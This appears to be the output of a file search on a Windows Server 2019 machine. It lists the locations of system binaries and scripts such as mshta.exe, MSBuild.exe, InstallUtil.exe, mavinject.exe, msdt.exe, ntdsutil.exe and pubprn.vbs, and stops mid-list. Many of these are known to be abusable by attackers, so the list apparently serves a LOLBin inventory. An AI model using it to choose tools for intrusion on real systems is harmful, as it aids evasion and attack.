Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\f\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\r\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\f\gpscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\r\gpscript.exe
Path: C:\Windows\hh.exe
Path: C:\Windows\SysWOW64\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1_none_b91be097dce5e710\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1_none_c3708aea1146a90b\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\f\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_15caed9d569d4604\r\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\f\hh.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.1697_none_201f97ef8afe07ff\r\hh.exe
Path: C:\Windows\System32\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.5830_none_56e2c57e59e38d54\r\ie4uinit.exe
Path: C:\Windows\System32\IEAdvpack.dll
Path: C:\Windows\SysWOW64\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_f3a9af329191e4a6\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_978b13aed9347370\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_5dfa66e22bfd5c70\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_a5a79db940798576\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
Path: C:\Windows\System32\InfDefaultInstall.exe
Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_5d5a6da4f438d5f5\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_67af17f7289997f0\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_d4948e9d0f25af26\InstallUtil.exe
Path: C:\Windows\WinSxS\x86_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_1c41c57423a1d82c\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_00f10a3ec57c2b75\jsc.exe
Path: C:\Windows\WinSxS\x86_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_489e4115d9f8547b\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
Path: C:\Windows\System32\makecab.exe
Path: C:\Windows\SysWOW64\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_e1956bcbc16844da\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_ebea161df5c906d5\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\f\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_3e76707d3afacc5e\r\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\f\makecab.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1158_none_48cb1acf6f5b8e59\r\makecab.exe
Path: C:\Windows\System32\mavinject.exe
Path: C:\Windows\SysWOW64\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.1_none_a3ffb62d4a90311f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.1_none_ae54607f7ef0f31a\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_00da7e48c42691ed\r\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\f\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.6292_none_0b2f289af88753e8\r\mavinject.exe
Path: C:\Windows\WinSxS\amd64_netfx4-microsoft.workflow.compiler_b03f5f7f11d50a3a_4.0.15713.0_none_582c8c015167cad5\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\WinSxS\msil_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15713.0_none_31438b4fdc7273c6\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\System32\mmc.exe
Path: C:\Windows\SysWOW64\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_003934f5cdcbaab6\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_0a8ddf48022c6cb1\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_5ccd47774797eab7\r\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.5830_none_6721f1c97bf8acb2\r\mmc.exe
Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_da500ddf9f3ce843\MSBuild.exe
Path: C:\Windows\WinSxS\x86_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_21fd44b6b3b91149\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\System32\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.1_none_cb402868f5e97c8d\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\f\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.2061_none_282d9eae6f724b37\r\msconfig.exe
Path: C:\Program Files\IIS\Microsoft Web Deploy V3\msdeploy.exe
Path: C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe
Path: C:\Windows\System32\msdt.exe
Path: C:\Windows\SysWOW64\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_96484bd875afe57a\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_f330db3fef3d161e\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_a09cf62aaa10a775\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_f330db3fef3d161e\f\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_f330db3fef3d161e\r\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\f\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.4010_none_fd858592239dd819\r\msdt.exe
Path: C:\Windows\System32\mshta.exe
Path: C:\Windows\SysWOW64\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_7e1153fecc60d8b3\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_8865fe5100c19aae\mshta.exe
Path: C:\Windows\System32\mshtml.dll
Path: C:\Windows\SysWOW64\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_a38ada00ad8aaa65\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.6292_none_addf8452e1eb6c60\r\mshtml.dll
Path: C:\Windows\System32\msiexec.exe
Path: C:\Windows\SysWOW64\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.1_none_3a475eb1de434ea1\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.1_none_449c090412a4109c\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_96f1b44f57fed974\r\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\f\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.4644_none_a1465ea18c5f9b6f\r\msiexec.exe
Path: C:\Windows\System32\netsh.exe
Path: C:\Windows\SysWOW64\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5066e02350023e4e\netsh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5abb8a7584630049\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_cc17025f87bcc81a\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_6ff866dbcf5f56e4\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\f\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_28f1ca7b015328e8\r\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\f\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.6292_none_ccd32ef748f5b7b2\r\ntdsutil.exe
Path: C:\Windows\System32\odbcconf.exe
Path: C:\Windows\SysWOW64\odbcconf.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_fe3cc4624a46a1fe\odbcconf.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_a21e28de91e930c8\odbcconf.exe
Path: C:\Windows\System32\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.1_none_248c6ff97b506e26\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\pcalua.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\f\pcalua.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.4492_none_81519470f4f70c88\r\pcalua.exe
Path: C:\Windows\System32\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\pcwrun.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\f\pcwrun.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\r\pcwrun.exe
Path: C:\Windows\System32\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\f\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.3287_none_42cb0800d1695076\r\pcwutl.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\f\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\r\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\f\pester.bat
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\r\pester.bat
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_c4f85489cbfa475b\Pester.bat
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_21e48dc545843e2d\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_cf4cfedc005b0956\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.6054_none_2c39381779e50028\Pester.bat
Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Windows\System32\PresentationHost.exe
Path: C:\Windows\SysWOW64\PresentationHost.exe
Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_60ba1d3678474a35\PresentationHost.exe
Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_049b81b2bfe9d8ff\PresentationHost.exe
Path: C:\Windows\System32\print.exe
Path: C:\Windows\SysWOW64\print.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\print.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\print.exe
Path: C:\Windows\System32\psr.exe
Path: C:\Windows\SysWOW64\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_cbb77b11a3232eea\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_d60c2563d783f0e5\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\f\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_286688171cda8dde\r\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\f\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1697_none_32bb3269513b4fd9\r\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.1_en-us_09c7f42dd8da8073\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\pubprn.vbs
Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\f\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_5c075c5d1e45fe79\r\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\f\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_665c06af52a6c074\r\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\f\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_en-us_ffe8c0d965e88d43\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_18b11101374ba21b\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_cs-cz_18b11101374ba21b\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_b5eaf1282d919e1a\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_da-dk_b5eaf1282d919e1a\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_b31686642f67f2b4\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_de-de_b31686642f67f2b4\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_5bacb3f71e7d5b42\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_el-gr_5bacb3f71e7d5b42\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_5bd2b9411e6cf01e\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_es-es_5bd2b9411e6cf01e\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_faedbdee1386e248\f\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fi-fi_faedbdee1386e248\r\pubprn.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.5830_fr-fr_fe8a2f40113f0680\f\pubprn.vbs
